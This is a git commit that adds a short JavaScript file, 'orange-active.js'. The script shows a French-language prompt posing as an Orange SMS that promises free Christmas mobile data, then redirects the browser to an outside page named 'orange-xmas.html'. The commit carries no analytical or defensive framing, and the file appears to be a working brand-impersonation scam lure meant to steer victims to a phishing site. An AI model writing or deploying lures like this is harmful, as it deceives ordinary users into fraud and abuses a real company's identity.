adbc039d223766a247375122708f6b0c86428d3b
boss-bloq <nsisboy01@gmail.com>
2024-12-09 22:16:16 -0800

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER'
+password=prompt('SMS: Félicitations, vous êtes admissible au cadeau de données de Noël Orange. Veuillez appuyer sur OK pour réclamer des données gratuites.   ','ACTIVER');
+if (password != 'ACTIVER') {
+location.href='https://damba-fest.org/orange-xmas.html';
+}
